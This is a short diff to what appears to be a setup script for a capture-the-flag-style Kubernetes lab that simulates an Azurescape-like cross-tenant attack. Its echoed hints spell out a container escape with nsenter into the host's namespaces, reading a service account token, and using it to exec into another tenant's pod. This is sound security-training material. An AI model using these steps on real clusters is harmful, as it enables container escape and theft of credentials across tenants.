@@ -10,8 +10,8 @@ echo "[*] Simulates Azurescape-style cross-tenant attack via shared KIND node"
 k8s_init
 k8s_create_cluster
 k8s_wait_ready
+k8s_write_node_flag /host-flag
 k8s_load_images python:3.11-slim nginx:1.24-alpine
-k8s_create_host_flag
 
 # Create tenant namespaces
 kubectl create namespace tenant-a
@@ -59,3 +59,5 @@ echo "    Exploit: nsenter --target 1 --mount --uts --ipc --net --pid -- sh"
 echo "    Then: cat /var/run/secrets/kubernetes.io/serviceaccount/token"
 echo "    Use bridge SA token to kubectl exec into tenant-b/target"
 echo "    Flag: env | grep FLAG inside target pod"
+
+k8s_publish_agent_identity pods-executor tenant-a
